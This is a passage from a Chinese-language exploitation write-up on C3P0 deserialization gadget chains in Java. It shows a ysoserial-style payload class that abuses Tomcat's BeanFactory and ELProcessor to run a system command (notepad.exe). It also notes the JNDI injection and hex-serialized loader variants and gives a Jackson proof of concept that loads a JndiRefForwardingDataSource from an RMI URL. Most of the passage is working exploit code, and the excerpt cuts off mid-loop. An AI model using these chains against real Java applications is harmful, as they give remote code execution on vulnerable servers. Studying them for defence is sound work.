            //return new Reference("exploit", this.className, this.url);
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", 
"", true,"org.apache.naming.factory.BeanFactory",null);
            ref.add(new StringRefAddr("forceString", "a=eval"));
            ref.add(new StringRefAddr("a", 
"Runtime.getRuntime().exec(\"notepad.exe\")"));
            return ref;
        }
        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException 
{return null;}
        public PooledConnection getPooledConnection () throws SQLException 
{return null;}
        public PooledConnection getPooledConnection ( String user, String 
password ) throws SQLException {return null;}
    }
    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(C3P0.class, args);
    }
}
JNDI 注入
这个和上面的利用方式一样，都需要出网，而且高版本 JNDI 注入存在诸多限制
hex序列化字节加载器
这种扩展攻击的利用方式不需要出网，利用二次反序列化可以利用其他的一些组件达到任意代码执
行的效果。利用场景：在一些非原生的反序列化（如 fastjson ）的情况下， c3p0 可以做到不出
网利用。其原理是利用 fastjson 的反序列化时调用 userOverridesAsString 的 setter ，在
setter 中运行过程中会把传入的以 HexAsciiSerializedMap 开头的字符串进行解码并触发原生
反序列化。
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.*;
class Person {
    public Object object;
}
public class TemplatePoc {
    public static void main(String[] args) throws IOException {
        String poc = "{\"object\":
[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",
{\"jndiName\":\"rmi://localhost:8088/Exploit\", \"loginTimeout\":0}]}";
        System.out.println(poc);
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();
        objectMapper.readValue(poc, Person.class);
    }
    public static byte[] toByteArray(InputStream in) throws IOException {
        byte[] classBytes;
        classBytes = new byte[in.available()];
        in.read(classBytes);
        in.close();
        return classBytes;
    }
    public static String bytesToHexString(byte[] bArray, int length) {
        StringBuffer sb = new StringBuffer(length);
        for(int i = 0; i 
org.apache.tomcat
tomcat-catalina
8.5.40
org.mortbay.jasper
apache-el
8.0.27